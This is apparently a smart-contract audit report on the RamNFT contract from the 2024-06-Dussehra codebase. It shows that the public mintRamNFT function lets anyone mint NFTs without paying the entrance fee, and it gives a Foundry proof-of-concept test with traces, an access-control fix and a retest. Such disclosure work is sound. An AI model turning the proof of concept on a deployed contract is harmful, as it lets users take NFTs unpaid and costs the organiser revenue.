# Unauthorized NFT Minting in RamNFT Contract            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2024-06-Dussehra/blob/main/src/RamNFT.sol

## Summary
The `RamNFT` contract allows `users` to `mint RamNFT` tokens without paying the required `entry fee` due to the `mintRamNFT` function being publicly accessible. This vulnerability can be exploited to bypass the intended process, allowing unauthorized `users` to `mint NFTs` without following the proper protocol and without contributing to the event’s `entrance fee`.

## Vulnerability Details
The `mintRamNFT` function in the `RamNFT` contract is marked as `public` and lacks proper `access control`, allowing any `use`r to call it directly. The absence of checks to verify the caller is the root cause of this vulnerability. This bypasses the intended process in the `enterPeopleWhoLikeRam` function, which ensures users pay the `entry fee` before `minting` an `NFT`.

Here is the vulnerable `mintRamNFT` function:
```solidity
 function mintRamNFT(address to) public {
        uint256 newTokenId = tokenCounter++;
        _safeMint(to, newTokenId);

        Characteristics[newTokenId] = CharacteristicsOfRam({
            ram: to,
            isJitaKrodhah: false,
            isDhyutimaan: false,
            isVidvaan: false,
            isAatmavan: false,
            isSatyavaakyah: false
        });
    }
```
And the intended function that `users` should call to `mint` an `NFT`:

```solidity
function enterPeopleWhoLikeRam() public payable {
    if (msg.value != entranceFee) {
        revert Dussehra__NotEqualToEntranceFee();
    }

    if (peopleLikeRam[msg.sender] == true){
        revert Dussehra__AlreadyPresent();
    }

    peopleLikeRam[msg.sender] = true;
    WantToBeLikeRam.push(msg.sender);
    ramNFT.mintRamNFT(msg.sender);
    emit PeopleWhoLikeRamIsEntered(msg.sender);
}
```
##### Cause
The root cause of this vulnerability is the lack of `access control` on the `mintRamNFT` function, which allows it to be called by any `user` directly without any checks.

##### Likelihood of Exploitation
The likelihood of this vulnerability being exploited is high. Since the function is `publicly` accessible and lacks any `access` restrictions, any`user` with knowledge of the `contract`can exploit it to `mint` `NFTs`without paying the required `entry fee`.

## Impact
This vulnerability enables any user to `mint` `RamNFT` tokens without paying the `entrance fee`, leading to several issues:

1. `Financial Losses`: The event `organize`r will lose revenue as users bypass the `entry fee`.
2. ` Integrity Undermined`: The integrity of the `Dussehra` event is compromised, as the process intended to be followed is bypassed.
3. `Fairness Disrupted`: The fairness of the event is affected, as` unauthorized users` can obtain `NFTs` without contributing.
4. `Participation and Rewards`: The overall participation and reward distribution of the event are disrupted.



## PoC
The `PoC` highlights al vulnerability in the `RamNFT` contract where any `use`r can `mint NFTs` without paying the required `entrance fee`. By simulating an attack scenario, the `PoC` demonstrates how an unauthorized `user` can directly call the `mintRamNFT` function, bypassing the intended fee mechanism and `minting` an `NFT` without proper authorization. Through careful setup and execution, the `PoC` confirms the presence of the vulnerability by asserting the `attacker's NFT balance`. 
```
    function test_ifAnybodyCanMintNFTWithouEntryFee()external {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        ramNFT.mintRamNFT(attacker);

        assertEq(ramNFT.balanceOf(attacker), 1);
    }
```
Running the `test` confirms the presence of the vulnerability, as it `passes` without any issues. This outcome underscores the urgent need to address the `unauthorized NFT minting` to ensure the event's integrity and fairness.
```
Ran 1 test for test/Dussehra.t.sol:CounterTest
[PASS] test_ifAnybodyCanMintNFTWithouEntryFee() (gas: 103740)
Traces:
  [103740] CounterTest::test_ifAnybodyCanMintNFTWithouEntryFee()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return] 
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return] 
    ├─ [92342] RamNFT::mintRamNFT(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], tokenId: 0)
    │   └─ ← [Stop] 
    ├─ [722] RamNFT::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

```

## Tools Used
1. Manual Code Review
2. Foundry

## Recommendations
To fix the vulnerability, we need to implement stricter `access control` measures in the `mintRamNF`T function of the `RamNFT` contract. We can achieve this by adding a new `error`, `modifier`, and `function` called `setDussehraContract`. First, we introduce the `RamNFT__NotDussehraContract` `error` to handle unauthorized calls. Then, we create the `onlyDussehraContract` `modifier` to restrict access to the `mintRamNFT` function to only the `Dussehra `contract. Finally, we add the `setDussehraContract` `function`, which allows the `organizer` to set the `Dussehra` contract address, ensuring proper authorization. These measures will enhance security by ensuring that only authorized contracts can `mint`` NFTs`, thereby mitigating the risk of unauthorized `minting`.

Here is the revised code with the necessary access control:
```diff
contract RamNFT is ERC721URIStorage {
    error RamNFT__NotOrganiser();
+   error RamNFT__NotDussehraContract();
    error RamNFT__NotChoosingRamContract();

    // https://medium.com/illumination/16-divine-qualities-of-lord-rama-24c326bd6048
    struct CharacteristicsOfRam {
        address ram;
        bool isJitaKrodhah;
        bool isDhyutimaan;
        bool isVidvaan;
        bool isAatmavan;
        bool isSatyavaakyah;
    }

    uint256 public tokenCounter;
    address public organiser;
    address public choosingRamContract;
+   address public dussehraContract;

    mapping(uint256 tokenId => CharacteristicsOfRam) public Characteristics;

    modifier onlyOrganiser() {
        if (msg.sender != organiser) {
            revert RamNFT__NotOrganiser();
        }
        _;
    }

+   modifier onlyDussehraContract() {
+      if (msg.sender != dussehraContract) {
+           revert RamNFT__NotDussehraContract();
+       }
+       _;
+   }

    modifier onlyChoosingRamContract() {
        if (msg.sender != choosingRamContract) {
            revert RamNFT__NotChoosingRamContract();
        }
        _;
    }

    constructor() ERC721("RamNFT", "RAM") {
        tokenCounter = 0;
        organiser = msg.sender;
    }

    function setChoosingRamContract(address _choosingRamContract) public onlyOrganiser {
        choosingRamContract = _choosingRamContract;
    }

+   function setDussehraContract(address _dussehraContract) public onlyOrganiser {
+       dussehraContract = _dussehraContract;
+   }


+   function mintRamNFT(address to) public onlyDussehraContract{
        uint256 newTokenId = tokenCounter++;
        _safeMint(to, newTokenId);

        Characteristics[newTokenId] = CharacteristicsOfRam({
            ram: to,
            isJitaKrodhah: false,
            isDhyutimaan: false,
            isVidvaan: false,
            isAatmavan: false,
            isSatyavaakyah: false
        });
    }

    function updateCharacteristics(
        uint256 tokenId,
        bool _isJitaKrodhah,
        bool _isDhyutimaan,
        bool _isVidvaan,
        bool _isAatmavan,
        bool _isSatyavaakyah
    ) public onlyChoosingRamContract {

        Characteristics[tokenId] = CharacteristicsOfRam({
            ram: Characteristics[tokenId].ram,
            isJitaKrodhah: _isJitaKrodhah,
            isDhyutimaan: _isDhyutimaan,
            isVidvaan: _isVidvaan,
            isAatmavan: _isAatmavan,
            isSatyavaakyah: _isSatyavaakyah
        });
    }

    function getCharacteristics(uint256 tokenId) public view returns (CharacteristicsOfRam memory) {
        return Characteristics[tokenId];
    }
    
    function getNextTokenId() public view returns (uint256) {
        return tokenCounter;
    }
}
```
After implementing these changes, we reran the `test` and observed that the `test`` failed`, specifically indicating that unauthorized `access` is no longer possible. 
```
Ran 1 test for test/Dussehra.t.sol:CounterTest
[FAIL. Reason: RamNFT__NotDussehraContract()] test_ifAnybodyCanMintNFTWithouEntryFee() (gas: 12304)
Traces:
  [2895634] CounterTest::setUp()
    ├─ [0] VM::startPrank(organiser: [0xe81f335f0c35d66819c4dF203d728f579880b4b1])
    │   └─ ← [Return] 
    ├─ [1241698] → new RamNFT@0x0696502956aEd8065cb9eDEEB69A6a64dF70C962
    │   └─ ← [Return] 5855 bytes of code
    ├─ [884456] → new ChoosingRam@0x42a9BB279f030dB5918a9B5071c92F411BbE7deb
    │   └─ ← [Return] 4306 bytes of code
    ├─ [569592] → new Dussehra@0x5FCbA0F5665F41bB742F48635F49d466C8D88c18
    │   └─ ← [Return] 2401 bytes of code
    ├─ [22699] RamNFT::setDussehraContract(Dussehra: [0x5FCbA0F5665F41bB742F48635F49d466C8D88c18])
    │   └─ ← [Stop] 
    ├─ [22678] RamNFT::setChoosingRamContract(ChoosingRam: [0x42a9BB279f030dB5918a9B5071c92F411BbE7deb])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

  [12304] CounterTest::test_ifAnybodyCanMintNFTWithouEntryFee()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return] 
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return] 
    ├─ [2528] RamNFT::mintRamNFT(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Revert] RamNFT__NotDussehraContract()
    └─ ← [Revert] RamNFT__NotDussehraContract()

```
## Conclusion
By implementing the above changes, the vulnerability of `unauthorized NFT minting `can be effectively mitigated. This ensures the integrity of the `Dussehra` event, maintains the value of the `NFTs`, and ensures fair participation and reward distribution.